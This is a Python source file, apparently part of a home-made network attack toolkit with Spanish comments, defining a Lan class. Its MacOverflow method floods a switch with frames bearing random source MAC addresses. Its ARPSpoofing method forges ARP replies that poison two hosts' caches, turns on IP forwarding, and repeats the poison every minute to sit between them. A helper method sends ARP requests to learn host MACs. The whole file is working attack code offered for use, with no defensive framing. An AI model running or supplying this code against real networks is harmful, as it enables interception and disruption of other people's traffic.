from layers.ethernet import Ethernet,EthernetARP
from general.general import General
from layers.arp import ARPRequest,ARPRepley
from time import sleep 
import socket

class Lan():
	def MacOverflow(self,iface,numero=10000,time=-1):
		getvalores = General()
		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
		s.bind((iface,0))

		while numero > 0:
			numero-=1
			ethernet = Ethernet()
			ethernet.src_mac =  getvalores.mac_random()
			ethernet.dst_mac = 'ff:ff:ff:dd:ee:cc' #no inporta este valor para el ataque
			ethernet_send = ethernet.create()
			s.send(ethernet_send)
			print('src_mac:'+ethernet.src_mac+' dst_mac:'+ethernet.dst_mac )
		


	def ARPSpoofing(self,iface,host1,host2):
	
		general = General()
		src_mac = '50:3e:aa:32:bd:9b'
		#src_mac = general.get_mac(iface)
		src_ip = general.get_ip()
		
		mac_host1 =self.ARPing(iface,host1)
		mac_host2 = self.ARPing(iface,host2)

		host1_ethernet = EthernetARP()
		host1_ethernet.src_mac = src_mac
		host1_ethernet.dst_mac = mac_host2
		sendether = host1_ethernet.create()

		host1_arp = ARPRepley()
		host1_arp.src_ip =  host1
		host1_arp.src_mac = src_mac
		host1_arp.dst_mac = mac_host2
		host1_arp.dst_ip = host2
		sendarp_host1 = host1_arp.create()

		host2_ethernet = EthernetARP()
		host2_ethernet.src_mac = src_mac
		host2_ethernet.dst_mac = mac_host1
		sendether2 = host2_ethernet.create()

		host2_arp = ARPRepley()
		host2_arp.src_ip = host2
		host2_arp.src_mac = src_mac
		host2_arp.dst_mac = mac_host1
		host2_arp.dst_ip = host1
		sendarp_host2 = host2_arp.create()

		forward = open('/proc/sys/net/ipv4/ip_forward','w')
		forward.write('1')
		forward.close()

		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
		s.bind((iface,0))

		while True:
			s.send(sendether+sendarp_host1)
			s.send(sendether2+sendarp_host2)	
			sleep(60)

	def ARPing(self,iface,host):

		general = General()
		src_mac = general.get_mac(iface)
		src_ip = general.get_ip()
		
		ethernet_arp = EthernetARP()
		ethernet_arp.src_mac = src_mac
		ethernet_arp.dst_mac = 'ff:ff:ff:ff:ff:ff' 
		sendetherarp = ethernet_arp.create()

		arp = ARPRequest()
		arp.src_ip = src_ip
		arp.src_mac = src_mac
		arp.dst_mac = 'ff:ff:ff:ff:ff:ff'
		arp.dst_ip = host
		sendarp = arp.create()

		s = socket.socket(socket.AF_PACKET,socket.SOCK_RAW)
		s.bind((iface,0))
		s.send(sendetherarp+sendarp)
		response = arp.response()
		return  response
		
		

